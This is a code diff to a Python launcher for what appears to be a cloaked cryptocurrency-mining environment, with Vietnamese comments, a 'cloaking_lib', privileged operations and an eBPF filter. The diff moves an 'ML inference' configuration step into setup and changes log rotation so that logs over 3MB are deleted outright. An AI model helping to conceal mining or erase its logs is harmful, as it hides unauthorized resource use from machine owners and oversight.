@@ -33,7 +33,6 @@ from mining_environment.cpu_plugins.cloaking_lib.utils import (
 from mining_environment.scripts.logging_config import setup_logging
 from mining_environment.scripts import setup_env, system_manager
 from mining_environment.scripts.privileged_operations import get_privileged_manager
-from mining_environment.cpu_plugins import get_inference_config
 
 # **Import** (nhập khẩu) **Mining Performance Logger** (trình ghi nhật ký hiệu suất khai thác – theo dõi và ghi lại các chỉ số)
 from mining_environment.logging.mining_performance_logger import (
@@ -67,19 +66,6 @@ signal.signal(signal.SIGTERM, signal_handler)
 def initialize_environment():
     logger.info("Bắt đầu thiết lập môi trường khai thác.")
     try:
-        # **Load** (tải dữ liệu) **ML inference configuration** (cấu hình suy luận máy học – thiết lập thông số cho quá trình suy luận)
-        ml_config = get_inference_config(process_info=None, logger=logger)
-        if not ml_config.validate_configuration():
-            logger.error("❌ Xác thực cấu hình suy luận ML thất bại")
-            sys.exit(1)
-
-        # **Setup** (thiết lập cài đặt) **environment variables** (biến môi trường – các tham số hệ thống) từ **config** (cấu hình)
-        env_vars = ml_config.get_environment_variables()
-        for key, value in env_vars.items():
-            os.environ[key] = value
-        
-        logger.info(f"🔧 Cấu hình suy luận ML: {ml_config}")
-        
         privileged_manager = get_privileged_manager(logger)
         security_context = privileged_manager.validate_security_context()
         logger.info(f"Bối cảnh bảo mật: User={security_context['user']}, Root={security_context['is_root']}")
@@ -101,6 +87,7 @@ def initialize_environment():
             else:
                 logger.info("ℹ️ eBPF filter object không tồn tại, chạy ở mock mode")
         
+        # **Centralized environment setup** (thiết lập môi trường tập trung) - bao gồm **ML inference configuration** (cấu hình suy luận máy học)
         setup_env.setup()
         logger.info("Thiết lập môi trường thành công.")
         return privileged_manager
@@ -129,24 +116,22 @@ def stop_system_manager():
 def is_mining_process_running(process):
     return process and process.poll() is None
 
-def rotate_log_file(log_path, max_size_mb=50):
+def rotate_log_file(log_path, max_size_mb=3):
     """
     **Log rotation** (xoay vòng tệp ghi nhật ký) để tránh **disk space issues** (vấn đề dung lượng đĩa cứng).
+    **Delete log files** (xóa tệp nhật ký) khi vượt quá **size limit** (giới hạn kích thước).
     
     Args:
         log_path (str): Đường dẫn đến tệp log cần xoay vòng
-        max_size_mb (int): Kích thước tối đa (MB) trước khi xoay vòng
+        max_size_mb (int): Kích thước tối đa (MB) trước khi xóa (mặc định: 3MB)
     """
     if not os.path.exists(log_path):
         return
         
     file_size_mb = os.path.getsize(log_path) / (1024 * 1024)
     if file_size_mb > max_size_mb:
-        backup_path = f"{log_path}.backup"
-        if os.path.exists(backup_path):
-            os.remove(backup_path)
-        os.rename(log_path, backup_path)
-        logger.info(f"Đã xoay vòng tệp log: {log_path} -> {backup_path}")
+        os.remove(log_path)
+        logger.info(f"Đã xóa tệp log do vượt quá {max_size_mb}MB: {log_path} (kích thước: {file_size_mb:.2f}MB)")
 
 def dual_logger_thread(process, log_file, process_name, log_lock):
     """
@@ -206,20 +191,17 @@ def dual_logger_thread(process, log_file, process_name, log_lock):
                     log_file.write(f"{formatted_line}\n".encode('utf-8'))
                     log_file.flush()
                     
-                    # **Log rotation check** (kiểm tra xoay vòng tệp nhật ký)
+                    # **Log rotation check** (kiểm tra xoay vòng tệp nhật ký) - **delete when over 3MB** (xóa khi vượt quá 3MB)
                     try:
-                        if log_file.tell() > 50 * 1024 * 1024:
+                        if log_file.tell() > 3 * 1024 * 1024:  # 3MB limit
                             current_path = log_file.name
                             log_file.close()
-                            backup_path = f"{current_path}.backup"
-                            if os.path.exists(backup_path):
-                                os.remove(backup_path)
-                            os.rename(current_path, backup_path)
-                            logger.info(f"📁 Đã xoay vòng log: {current_path} -> {backup_path}")
+                            os.remove(current_path)
+                            logger.info(f"🗑️ Đã xóa log do vượt quá 3MB: {current_path}")
                             # **Reopen new file** (mở lại tệp mới)
                             log_file = open(current_path, 'ab', buffering=0)
                     except Exception as rot_err:
-                        logger.warning(f"⚠️ Xoay vòng log thất bại: {rot_err}")
+                        logger.warning(f"⚠️ Xóa log thất bại: {rot_err}")
                     
                     # **Advanced hash rate detection** (phát hiện tốc độ băm nâng cao – nhận diện các chỉ số hiệu suất)
                     hash_rate_match = re.search(r'(\d+(?:\.\d+)?)\s*(H/s|KH/s|MH/s|GH/s|TH/s)', line)
